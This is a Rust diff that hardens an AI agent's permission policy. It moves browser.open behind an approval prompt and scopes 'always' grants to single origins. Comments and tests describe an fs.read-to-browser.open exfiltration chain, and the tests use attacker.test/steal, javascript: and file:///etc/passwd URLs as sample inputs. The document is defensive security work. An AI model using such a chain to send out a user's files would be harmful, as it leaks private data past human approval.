@@ -142,8 +142,26 @@ impl Default for Policy {
                 Rule::allow("fs.list"),
                 Rule::ask("fs.write", "writes a file into the workspace"),
                 Rule::ask("shell.exec", "runs a shell command on the computer"),
-                // Reading the web is browsing; acting on a page is not.
-                Rule::allow("browser.open"),
+                // Reading the web is browsing; *fetching* it is not, and the
+                // difference is the whole content of this rule.
+                //
+                // `browser.open` issues an outbound request to a destination the
+                // model chose, with model-chosen bytes in the path. That is a
+                // write to somebody else's server wearing a GET, and it made
+                // `fs.read` → `browser.open https://elsewhere/?q=<contents>` a
+                // complete exfiltration chain needing no prompt at all. The old
+                // comment here said "reading the web is browsing" and was true
+                // of `browser.read`, one line below.
+                //
+                // Asking per call would make browsing unusable, so the answer is
+                // scoped rather than repeated: approving an origin covers that
+                // origin for the session, and nothing else. `browser.read` and
+                // the rest stay free, because they describe a page the Bot is
+                // already on and change nothing. Finding F-GT3.
+                Rule::ask(
+                    "browser.open",
+                    "opens a URL, sending this computer's request to that origin",
+                ),
                 Rule::allow("browser.read"),
                 Rule::allow("browser.links"),
                 // Same class as `read`: it describes the page the Bot already
@@ -243,6 +261,19 @@ impl Policy {
             return Verdict::Allow;
         }
 
+        // Or "always, at this origin": one prompt per site rather than one per
+        // page, without turning the answer into a pass for the whole web. The
+        // origin comes from the call's own `url`, so this is checked against
+        // what will actually be opened. No `url`, or a `url` with no
+        // derivable origin, means no grant matches and the `ask` below stands.
+        if let Some(url) = args.get("url").and_then(|v| v.as_str()) {
+            if let Some(origin) = url_origin(url) {
+                if self.grants.contains(&origin_grant_key(tool, &origin)) {
+                    return Verdict::Allow;
+                }
+            }
+        }
+
         // Ask outranks allow, so a broad `allow *` cannot silently swallow a
         // narrow `require approval`.
         if let Some(reason) = ask {
@@ -267,6 +298,86 @@ impl Policy {
     pub fn allow_from_now_on(&mut self, tool: &str) {
         self.grants.insert(tool.to_owned());
     }
+
+    /// Record an "allow for the rest of this session" answer scoped to one
+    /// origin, so approving a site does not ask again on every page of it.
+    ///
+    /// A grant keyed on the tool alone is the wrong shape for a tool whose
+    /// argument *is* the destination: approving `browser.open` once would then
+    /// mean approving every host on the web for the rest of the session, which
+    /// is the same hole the gate was added to close, reached by answering the
+    /// prompt rather than by ignoring it.
+    pub fn allow_origin_from_now_on(&mut self, tool: &str, origin: &str) {
+        // Normalise on the way in as well as on the way out, so a caller that
+        // passes `https://example.com:443` and one that passes
+        // `https://example.com` cannot produce two grants for one destination.
+        let key = match url_origin(origin) {
+            Some(normalized) => origin_grant_key(tool, &normalized),
+            None => origin_grant_key(tool, origin),
+        };
+        self.grants.insert(key);
+    }
+
+    /// Record "allow for the rest of this session" for one call, scoped as
+    /// narrowly as that call allows.
+    ///
+    /// This is what the hub calls when a person answers "always". The
+    /// granularity is the policy's decision, not the caller's, for one reason:
+    /// the caller is the code that was wrong last time. When `browser.open`'s
+    /// "always" was recorded against the tool, answering the prompt once granted
+    /// every host on the web for the rest of the session — the same hole the
+    /// prompt was added to close, reached by answering it. Deciding here means
+    /// the rule cannot be forgotten at a second call site.
+    ///
+    /// A call with no `url`, or a `url` from which no origin can be derived,
+    /// gets the tool-wide grant it always got.
+    pub fn allow_from_now_on_for(&mut self, tool: &str, args: &Value) {
+        match args
+            .get("url")
+            .and_then(|v| v.as_str())
+            .and_then(url_origin)
+        {
+            Some(origin) => self.allow_origin_from_now_on(tool, &origin),
+            None => self.allow_from_now_on(tool),
+        }
+    }
+}
+
+/// The origin a `url` argument points at, as `scheme://host[:port]`.
+///
+/// Computed **here**, from the string the hub is about to forward to the guest,
+/// and never read out of the call. The obvious alternative — having the agent
+/// pass an `origin` field for the policy to match on — makes the gate forgeable
+/// by the thing it gates: `url` to anywhere, `origin` to somewhere already
+/// approved. `a_caller_supplied_origin_cannot_widen_the_gate` is that attack.
+///
+/// `None` for anything that is not http(s), including a string that does not
+/// parse. Failing closed is the point: an origin the hub cannot establish is an
+/// origin no grant may cover, so a malformed URL skips nothing.
+fn url_origin(url: &str) -> Option<String> {
+    let parsed = url::Url::parse(url).ok()?;
+    if !matches!(parsed.scheme(), "http" | "https") {
+        return None;
+    }
+    // `host_str` excludes any userinfo, so `https://u:p@elsewhere.test/` cannot
+    // borrow an approval granted to a host that merely appears in the string.
+    let host = parsed.host_str()?;
+    // The `url` crate lowercases the host and drops a default port, so
+    // `https://EXAMPLE.com:443` and `https://example.com` agree on their own.
+    Some(match parsed.port() {
+        Some(port) => format!("{}://{host}:{port}", parsed.scheme()),
+        None => format!("{}://{host}", parsed.scheme()),
+    })
+}
+
+/// Key for a grant that applies to one origin of one tool.
+///
+/// A space separates the two halves. Tool ids are `[a-z0-9_.-]` and an origin
+/// contains no spaces, so the split is unambiguous, and the key stays readable
+/// in `permission ls` and in a session's serialised policy — a grant set
+/// someone cannot read is a grant set nobody can audit.
+fn origin_grant_key(tool: &str, origin: &str) -> String {
+    format!("{tool} {origin}")
 }
 
 /// Glob with a single `*` wildcard, matching any run of characters.
@@ -445,6 +556,248 @@ mod tests {
         p.allow_from_now_on("fs.write");
         p.allow_from_now_on("fs.write");
         assert_eq!(p.grants.len(), 1);
+    }
+
+    // ── T2-3: `browser.open` is an exfiltration primitive, not browsing ─────────
+    //
+    // `browser.open` takes any http(s) URL and the default policy allowed it
+    // outright, under the comment "Reading the web is browsing". That is true of
+    // `browser.read` and false of `open`: a GET with model-chosen bytes in the
+    // path is a write to the other end. The chain
+    // `fs.read` → `browser.open https://elsewhere/?q=<contents>` needed no
+    // approval at all. Finding F-GT3 in `.claude/product-review/reports/`.
+
+    #[test]
+    fn opening_a_url_asks_because_it_is_a_request_not_a_read() {
+        let p = Policy::default();
+        assert!(
+            matches!(
+                p.evaluate("browser.open", &json!({ "url": "https://example.com/a" })),
+                Verdict::Ask(_)
+            ),
+            "an unprompted outbound GET is the cheapest exfiltration channel in the \
+             product; the default must not permit it"
+        );
+        // The reason is shown to the person, so it has to say what will happen.
+        let reason = match p.evaluate("browser.open", &json!({ "url": "https://example.com/" })) {
+            Verdict::Ask(r) => r,
+            other => panic!("expected Ask, got {other:?}"),
+        };
+        assert!(
+            reason.contains("origin") || reason.contains("web"),
+            "the approver is shown {reason:?}, which does not say what is being asked"
+        );
+    }
+
+    #[test]
+    fn reading_the_page_is_still_free() {
+        // The gate is on `open` alone. If this regressed, the fix would be
+        // "ask about everything", which is not a fix.
+        let p = Policy::default();
+        for tool in [
+            "browser.read",
+            "browser.links",
+            "browser.snapshot",
+            "browser.scroll",
+        ] {
+            assert_eq!(
+                p.evaluate(tool, &json!({})),
+                Verdict::Allow,
+                "{tool} describes a page the Bot already has open"
+            );
+        }
+    }
+
+    #[test]
+    fn an_origin_grant_stops_the_repeat_prompt_and_widens_to_nothing_else() {
+        let mut p = Policy::default();
+        let here = json!({ "url": "https://example.com/one" });
+        p.allow_origin_from_now_on("browser.open", "https://example.com");
+
+        assert_eq!(
+            p.evaluate("browser.open", &here),
+            Verdict::Allow,
+            "the person already said yes to this origin for the session"
+        );
+        // A different path on the same origin is the same decision.
+        assert_eq!(
+            p.evaluate(
+                "browser.open",
+                &json!({ "url": "https://example.com/two?x=1" })
+            ),
+            Verdict::Allow
+        );
+        // A different origin is a different decision, and this is the whole
+        // point: a grant for one site must not become a grant for the web.
+        assert!(
+            matches!(
+                p.evaluate(
+                    "browser.open",
+                    &json!({ "url": "https://elsewhere.example/x" })
+                ),
+                Verdict::Ask(_)
+            ),
+            "an origin grant widened past the origin the person approved"
+        );
+    }
+
+    #[test]
+    fn an_origin_grant_distinguishes_scheme_port_and_case() {
+        let mut p = Policy::default();
+        p.allow_origin_from_now_on("browser.open", "https://example.com");
+        for url in [
+            "http://example.com/",            // scheme
+            "https://example.com:8443/",      // port
+            "https://sub.example.com/",       // host
+            "https://example.com.evil.test/", // suffix, not subdomain
+        ] {
+            assert!(
+                matches!(
+                    p.evaluate("browser.open", &json!({ "url": url })),
+                    Verdict::Ask(_)
+                ),
+                "{url} shares a prefix with the approved origin but is a different \
+                 destination, and must still ask"
+            );
+        }
+        // Host case is not part of identity: DNS is case-insensitive and a model
+        // that capitalises the host has not gone anywhere new.
+        assert_eq!(
+            p.evaluate("browser.open", &json!({ "url": "https://EXAMPLE.com/x" })),
+            Verdict::Allow
+        );
+    }
+
+    /// The origin is computed by the hub from the `url` it is about to forward,
+    /// never read from the call.
+    ///
+    /// The tempting shortcut is to have the caller pass `origin` alongside `url`
+    /// so the policy has something to match on. That would let the agent pick
+    /// the string the gate reads: `url` to anywhere, `origin` to something
+    /// already approved. The guest is untrusted and so is the agent; only the
+    /// hub may decide what a call is asking for.
+    #[test]
+    fn a_caller_supplied_origin_cannot_widen_the_gate() {
+        let mut p = Policy::default();
+        p.allow_origin_from_now_on("browser.open", "https://example.com");
+        assert!(
+            matches!(
+                p.evaluate(
+                    "browser.open",
+                    &json!({ "url": "https://attacker.test/steal", "origin": "https://example.com" })
+                ),
+                Verdict::Ask(_)
+            ),
+            "an `origin` argument in the call decided the verdict; the gate is \
+             forgeable by the thing it gates"
+        );
+    }
+
+    #[test]
+    fn a_url_the_hub_cannot_parse_still_asks() {
+        let mut p = Policy::default();
+        p.allow_origin_from_now_on("browser.open", "https://example.com");
+        // No origin can be derived, so no grant can match. Failing closed here is
+        // the whole point: a malformed URL that skipped the gate would be a hole
+        // shaped exactly like the one being closed.
+        for bad in ["not a url", "", "javascript:alert(1)", "file:///etc/passwd"] {
+            assert!(
+                matches!(
+                    p.evaluate("browser.open", &json!({ "url": bad })),
+                    Verdict::Ask(_)
+                ),
+                "{bad:?} produced a verdict other than Ask"
+            );
+        }
+    }
+
+    #[test]
+    fn a_deny_still_beats_an_origin_grant() {
+        let mut p = Policy::default();
+        p.allow_origin_from_now_on("browser.open", "https://example.com");
+        p.rules
+            .push(Rule::deny("browser.open", "no web from this Bot"));
+        assert!(
+            matches!(
+                p.evaluate("browser.open", &json!({ "url": "https://example.com/" })),
+                Verdict::Deny(_)
+            ),
+            "a grant overrode an outright ban"
+        );
+    }
+
+    #[test]
+    fn an_origin_grant_does_not_apply_to_another_tool() {
+        let mut p = Policy::default();
+        p.allow_origin_from_now_on("browser.open", "https://example.com");
+        // `browser.click` is already `ask`; the point is that approving a
+        // destination did not quietly approve acting on it.
+        assert!(
+            matches!(p.evaluate("browser.click", &json!({})), Verdict::Ask(_)),
+            "an origin grant for browser.open reached browser.click"
+        );
+    }
+
+    #[test]
+    fn origin_grants_survive_a_policy_round_trip() {
+        let mut p = Policy::default();
+        p.allow_origin_from_now_on("browser.open", "https://example.com");
+        let j = serde_json::to_value(&p).unwrap();
+        let back: Policy = serde_json::from_value(j).unwrap();
+        assert_eq!(
+            back.evaluate("browser.open", &json!({ "url": "https://example.com/x" })),
+            Verdict::Allow,
+            "a session grant did not survive serialisation"
+        );
+    }
+
+    /// "Always" is scoped by the call, not by the tool.
+    ///
+    /// This is the method the hub actually calls, and it had no unit test — the
+    /// only thing covering it was a live test, so regressing it surfaced as an
+    /// integration failure with a real browser in the path rather than as a
+    /// one-line policy failure. Found by mutating this method back to its old
+    /// tool-wide behaviour and noticing all 22 unit tests stayed green.
+    #[test]
+    fn always_is_scoped_by_the_call_and_falls_back_to_the_tool() {
+        let mut scoped = Policy::default();
+        scoped.allow_from_now_on_for(
+            "browser.open",
+            &json!({ "url": "https://example.com/deep/path?q=1" }),
+        );
+        assert_eq!(scoped.grants.len(), 1, "one answer, one grant");
+        assert!(
+            scoped
+                .grants
+                .iter()
+                .all(|g| g.contains("https://example.com")),
+            "the grant was not origin-scoped: {:?}",
+            scoped.grants
+        );
+        assert!(
+            matches!(
+                scoped.evaluate("browser.open", &json!({ "url": "https://other.example/" })),
+                Verdict::Ask(_)
+            ),
+            "an origin-scoped grant answered a different origin"
+        );
+
+        // A call with no url, or one no origin can be derived from, keeps the
+        // tool-wide grant it has always had — every tool that is not a URL
+        // fetcher is unaffected by any of this.
+        for args in [
+            json!({}),
+            json!({ "url": "not a url" }),
+            json!({ "url": 7 }),
+        ] {
+            let mut wide = Policy::default();
+            wide.allow_from_now_on_for("shell.exec", &args);
+            assert!(
+                wide.grants.contains("shell.exec"),
+                "a call with no derivable origin lost its tool-wide grant: {:?} for {args}",
+                wide.grants
+            );
+        }
     }
 
     #[test]
